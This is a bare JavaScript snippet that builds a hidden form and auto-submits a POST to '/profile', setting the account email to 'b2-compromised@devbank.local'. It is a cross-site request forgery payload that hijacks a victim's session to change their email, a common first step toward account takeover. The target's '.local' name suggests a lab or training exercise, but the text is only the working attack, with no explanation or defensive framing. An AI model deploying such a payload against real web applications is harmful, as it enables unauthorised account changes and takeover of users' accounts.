const form = document.createElement("form");
form.method = "POST";
form.action = "/profile";

const email = document.createElement("input");
email.type = "hidden";
email.name = "email";
email.value = "b2-compromised@devbank.local";

form.appendChild(email);
document.body.appendChild(form);
form.submit();
